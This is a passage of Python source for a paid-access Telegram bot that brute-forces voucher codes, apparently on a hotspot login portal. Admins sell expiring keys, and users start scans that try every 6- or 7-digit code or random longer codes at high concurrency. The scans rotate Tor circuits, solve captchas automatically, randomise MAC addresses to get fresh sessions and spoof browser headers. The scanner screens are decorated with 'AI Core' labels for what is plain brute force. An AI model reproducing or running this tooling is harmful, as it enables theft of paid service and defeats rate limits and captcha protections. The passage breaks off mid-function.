        if edit and await _edit_callback_message(message, text, reply_markup):
            return
        await bot.reply_to(message, text, reply_markup=reply_markup)

    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        valid = check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {"key": key}
            await respond(
                f"Key မှန်ကန်ပါသည်။\n\n"
                f"{build_main_menu_text(message.chat.id)}",
                reply_markup=build_main_menu(message.chat.id),
            )
        else:
            approve[message.chat.id] = False
            await respond(
                f"Key Expired ဖြစ်နေပါသည်။\n\n"
                f"{build_main_menu_text(message.chat.id)}",
                build_main_menu(message.chat.id),
            )
    else:
        await respond(
            f"သင်၏ key ကို registered မလုပ်ရသေးပါ။\n\n"
            f"{build_main_menu_text(message.chat.id)}",
            build_main_menu(message.chat.id),
        )

ADMIN_ID = "8363372270"

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f" Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Add key for {user_id}"
        )
        await bot.reply_to(
            message,
            f" Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message, edit=False):
    async def respond(text, reply_markup=None):
        if edit and await _edit_callback_message(message, text, reply_markup):
            return
        await bot.reply_to(message, text, reply_markup=reply_markup)

    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) in auth_list:
        results, _ = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n".join(results[chat_id_str])
            await respond(
                f"✅ Found Codes:\n{codes}",
                build_main_menu(message.chat.id),
            )
        else:
            await respond(
                "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။",
                build_main_menu(message.chat.id),
            )
    else:
        await respond(
            "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။",
            build_main_menu(message.chat.id),
        )

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(
                expiry.replace("Z", "+00:00")
            )
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message, edit=False):
    async def respond(text, reply_markup=None):
        if edit and await _edit_callback_message(message, text, reply_markup):
            return
        await bot.reply_to(message, text, reply_markup=reply_markup)

    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await respond(
            "Recheck မလုပ်မီ 🔑 Activate Key ခလုတ်ကို အရင်နှိပ်ပါ။",
            build_main_menu(chat_id),
        )
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) in auth_list:
        results, sha = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            if message.chat.id not in user_data:
                await respond(
                    "🔑 Activate Key ခလုတ်ကို အရင်နှိပ်ပါ။",
                    build_main_menu(chat_id),
                )
                return
            if "session_url" not in user_data[message.chat.id]:
                await respond(
                    "📥 Input Session ခလုတ်ကိုနှိပ်ပြီး URL ထည့်ပါ။",
                    build_main_menu(chat_id),
                )
                return
            codes = results[chat_id_str]
            await respond("Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            session_url_recheck = user_data[message.chat.id]["session_url"]
            recheck_list = []
            for code in codes:
                recode = await perform_check(
                    session_url_recheck,
                    code,
                    chat_id,
                    scan_id=None,
                    recheck=True,
                    message=message
                )
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await respond(
                f"✅ Rechcked Codes:\n\n{to_show}",
                build_main_menu(chat_id),
            )
            await save_rechecked_codes(chat_id_str, recheck_list, sha)
        else:
            await respond(
                "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။",
                build_main_menu(chat_id),
            )
    else:
        await respond(
            "သင်၏ key ကို registered မလုပ်ရသေးပါ။",
            build_main_menu(chat_id),
        )

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            body = await response.text()
            print(f"[check_session_url] final_url={final_url} status={response.status}")
            if "sessionId" in final_url or "sessionId" in body:
                return True
            if response.status in (200, 302, 301):
                return True
            return False
    except Exception as e:
        print(f"[check_session_url] error: {e}")
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "📥 Input Session ခလုတ်ကိုနှိပ်ပြီး URL ကို ဒီ chat ထဲ ပို့ပါ။"
        )
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(
                message,
                "Session URL သိမ်းပြီးပါပြီ။\n\n"
                f"{build_main_menu_text(message.chat.id)}",
                reply_markup=build_main_menu(message.chat.id),
            )
        else:
            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message, edit=False):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "⚙ Scanner Mode ခလုတ်ကိုနှိပ်ပြီး mode ရွေးပါ။"
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "🔑 Activate Key ခလုတ်ကို အရင်နှိပ်ပါ။")
        return
    chat_id = message.chat.id
    if chat_id not in user_data:
        await bot.reply_to(message, "🔑 Activate Key ခလုတ်ကို အရင်နှိပ်ပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "📥 Input Session ခလုတ်ကို အရင်နှိပ်ပါ။")
        return

    user_data[chat_id]["mode"] = mode

    if (
        chat_id in scan_tasks
        and not scan_tasks[chat_id]["task"].done()
    ):
        await bot.reply_to(
            message,
            "Scan အလုပ်လုပ်နေပြီးပါပြီ။ ထပ်မနှိပ်ပါနှင့်။"
        )
        return

    progress_text = (
        "🤖 AI Core: results synchronized\n\n"
        "⚡ Scanner Running ⚡\n"
        "Thank for using By Telegram @K_Paing2025\n\n"
        "🔎 Searching codes..."
    )
    if edit and await _edit_callback_message(
        message,
        progress_text,
        reply_markup=build_scan_control_markup(),
    ):
        progress_msg = message
    else:
        progress_msg = await bot.send_message(
            chat_id,
            progress_text,
            reply_markup=build_scan_control_markup(),
        )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
        "checked": 0,
        "total": None,
        "speed": 0,
        "found": 0,
        "retries": 0,
        "start_time": time.monotonic(),
        "mode": None,
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(
        1 for data in scan_tasks.values()
        if not data["task"].done()
    )
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['setconcurrency'])
async def set_concurrency(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global CONCURRENCY
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(
            message,
            f"Usage: /setconcurrency 1-{MAX_CONCURRENCY}\n"
            f"Current: {CONCURRENCY}",
        )
        return
    CONCURRENCY = max(1, min(int(args[1]), MAX_CONCURRENCY))
    await bot.reply_to(message, f"✅ Concurrency set to {CONCURRENCY}")

@bot.message_handler(commands=['setbatch'])
async def set_batch(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global BATCH_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, f"Usage: /setbatch 1000\nCurrent: {BATCH_SIZE}")
        return
    BATCH_SIZE = int(args[1])
    await bot.reply_to(message, f"✅ Batch size set to {BATCH_SIZE}")

@bot.message_handler(commands=['settorpool'])
async def set_tor_pool(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    global TOR_POOL_SIZE
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit() or int(args[1]) < 1:
        await bot.reply_to(message, f"Usage: /settorpool 5\nCurrent: {TOR_POOL_SIZE} (active: {len(_tor_processes)})")
        return
    TOR_POOL_SIZE = int(args[1])
    await bot.reply_to(
        message,
        f"✅ Tor pool size set to {TOR_POOL_SIZE}\n"
        f"ℹ️ Applies on next /proxy toggle (current active: {len(_tor_processes)})"
    )

@bot.message_handler(commands=['stats'])
async def scan_stats(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active = {cid: d for cid, d in scan_tasks.items() if not d["task"].done()}
    if not active:
        await bot.reply_to(message, "📭 No active scans running.")
        return
    lines = [f"📡 Live Scan Stats ({len(active)} active)\n"]
    for cid, d in active.items():
        checked = d.get("checked", 0)
        total = d.get("total")
        speed = d.get("speed", 0)
        found = d.get("found", 0)
        retries = d.get("retries", 0)
        mode = d.get("mode", "?")
        elapsed_s = int(time.monotonic() - d.get("start_time", time.monotonic()))
        h, rem = divmod(elapsed_s, 3600)
        m, s = divmod(rem, 60)
        elapsed_str = f"{h}h {m}m {s}s" if h else f"{m}m {s}s"
        if total:
            percent = (checked / total) * 100
            remaining_codes = total - checked
            eta_min = (remaining_codes / speed) if speed > 0 else None
            eta_str = f"{int(eta_min)}m" if eta_min is not None else "Unknown"
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}-digit\n"
                f"📦 Checked: {checked:,}/{total:,} ({percent:.1f}%)\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str} | ETA: {eta_str}\n"
            )
        else:
            lines.append(
                f"👤 User: {cid}\n"
                f"🎯 Mode: {mode}\n"
                f"📦 Checked: {checked:,}\n"
                f"⚡ Speed: {speed:,.0f} codes/min\n"
                f"✅ Found: {found} | 🔁 Retry: {retries}\n"
                f"⏱ Elapsed: {elapsed_str}\n"
            )
    await bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stop'])
async def stop_scan(message, edit=False):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
        await bot.send_message(chat_id, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.send_message(chat_id, "လက်ရှိ ရပ်တန့်ရန် scan မရှိပါ။")

    await bot.send_message(
        chat_id,
        build_main_menu_text(chat_id),
        reply_markup=build_main_menu(chat_id),
    )

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"        🤖  N E X U S   A I  •  C O R E\n"
            f"╭────────────────────────────────────╮\n"
            f"│  ◉ SYSTEM ONLINE     ⚙ DEEP SCAN  │\n"
            f"│  ───────────────────────────────── │\n"
            f"│  🧠 Neural Engine    ACTIVE        │\n"
            f"│  🔗 Network Nodes    CONNECTED     │\n"
            f"│  🛡 Shield Status     STABLE        │\n"
            f"╰────────────────────────────────────╯\n\n"
            f"╭─〔 SCAN TELEMETRY 〕────────────────╮\n"
            f"│ 📦 DATA STREAM   {checked:,} / {total:,}\n"
            f"│ 📊 COMPLETION    {percent:.2f}%\n"
            f"│                                    │\n"
            f"│   [{bar}]            │\n"
            f"│                                    │\n"
            f"│ ⚡ PROCESS RATE   {speed_str}\n"
            f"│ ✅ SIGNAL FOUND  {found:02d}\n"
            f"│ 🔁 RETRY QUEUE   {retries:02d}\n"
            f"╰────────────────────────────────────╯\n\n"
            f"🤖 AI Core: scanning...\n"
            f"◉ Status: OPERATIONAL"
        )
    return (
        f"        🤖  N E X U S   A I  •  C O R E\n"
        f"╭────────────────────────────────────╮\n"
        f"│  ◉ SYSTEM ONLINE     ⚙ DEEP SCAN  │\n"
        f"│  ───────────────────────────────── │\n"
        f"│  🧠 Neural Engine    ACTIVE        │\n"
        f"│  🔗 Network Nodes    CONNECTED     │\n"
        f"│  🛡 Shield Status     STABLE        │\n"
        f"╰────────────────────────────────────╯\n\n"
        f"╭─〔 SCAN TELEMETRY 〕────────────────╮\n"
        f"│ 📦 DATA STREAM   {checked:,}\n"
        f"│ ⚡ PROCESS RATE   {speed_str}\n"
        f"│ ✅ SIGNAL FOUND  {found:02d}\n"
        f"│ 🔁 RETRY QUEUE   {retries:02d}\n"
        f"╰────────────────────────────────────╯\n\n"
        f"🤖 AI Core: scanning...\n"
        f"◉ Status: OPERATIONAL"
    )


def format_success_results(entries):
    verified = 0
    unknown = 0
    result_lines = []

    for index, entry in enumerate(entries, 1):
        match = re.search(
            r"🎫\s*(\S+)\s*\n\s*📋 Plan:\s*(.*?)\s*\|\s*⏳ Time:\s*(.*)",
            entry,
        )
        if match:
            code, plan, duration = match.groups()
        else:
            code = entry.replace("🎫", "").strip()
            plan = "Unknown"
            duration = "Unknown"

        if plan == "Unknown" or duration == "Unknown":
            unknown += 1
        else:
            verified += 1

        result_lines.append(
            f"{index:02d}  🎫 {code}  •  📋 {plan}  •  ⏳ {duration}"
        )

    total = len(entries)
    return (
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ 🤖 AI RESULT CENTER      ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ SIGNALS FOUND      {total:02d}    ┃\n"
        f"┃ VERIFIED           {verified:02d}    ┃\n"
        f"┃ UNKNOWN            {unknown:02d}    ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"{chr(10).join(result_lines)}\n\n"
        f"🤖 AI Core: results synchronized\n\n"
        f"⚡ Scanner Running ⚡\n"
        f"Thank for using By Telegram @K_Paing2025"
    )


BATCH_SIZE = 5000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                print(f"[captcha] solved sid={session_id} code={text}")
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["total"] = total
        scan_tasks[chat_id]["mode"] = mode
        scan_tasks[chat_id]["start_time"] = scan_start
    global _voucher_sem
    effective_concurrency = min(
        MAX_CONCURRENCY,
        (300 * max(1, len(_tor_connectors))) if proxy_enabled else CONCURRENCY,
    )
    _voucher_sem = asyncio.Semaphore(effective_concurrency)

    pending: set = set()
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(
                session_url, code, chat_id, scan_id, message=message
            )

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 2.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        retries = retry_counts.get(chat_id, 0)
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["checked"] = checked
            scan_tasks[chat_id]["speed"] = speed
            scan_tasks[chat_id]["found"] = found
            scan_tasks[chat_id]["retries"] = retries
        found_entries = success_texts.get(chat_id, [])
        found_block = ""
        if found_entries:
            found_block = "\n\n✅ FOUND CODES\n" + "\n\n".join(found_entries)
        text = (
            "🤖 AI Core: results synchronized\n\n"
            "⚡ Scanner Running ⚡\n"
            "Thank for using By Telegram @K_Paing2025\n\n"
            f"{format_progress(checked, total, speed, found, retries)}"
            f"{found_block}"
        )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                reply_markup=build_scan_control_markup(),
            )
        except Exception:
            try:
                new_msg = await bot.send_message(
                    chat_id,
                    text,
                    reply_markup=build_scan_control_markup(),
                )
                progress_msg.message_id = new_msg.message_id
            except Exception as err:
                print(f"Progress Message Error: {err}")

    try:
        for index, code in enumerate(code_iter, 1):
            # Stop / cancelled check
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                break
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                break

            # Key expiration check every 600 s
            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (
                    str(chat_id) not in auth_list
                    or not check_key_expiration(auth_list[str(chat_id)])
                ):
                    approve[chat_id] = False
                    await bot.send_message(
                        chat_id,
                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
                    )
                    scan_tasks.pop(chat_id, None)
                    success_messages.pop(chat_id, None)
                    success_texts.pop(chat_id, None)
                    break
                last_key_check = time.monotonic()

            # Launch task; discard from pending set on completion
            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            # Give Telegram polling and callback handlers a chance to run
            # while a large scan is filling the in-flight queue.
            if index % 25 == 0:
                await asyncio.sleep(0)

            # When at capacity: wait for at least one to finish before adding more
            if len(pending) >= effective_concurrency:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        # Drain remaining in-flight tasks
        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "🤖 AI Core: results synchronized\n\n"
                "⚡ Scanner Completed ⚡\n"
                "Thank for using By Telegram @K_Paing2025\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            if success_texts.get(chat_id):
                finish_text += "\n\n✅ FOUND CODES\n" + "\n\n".join(success_texts[chat_id])
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text,
                    reply_markup=build_scan_control_markup(),
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
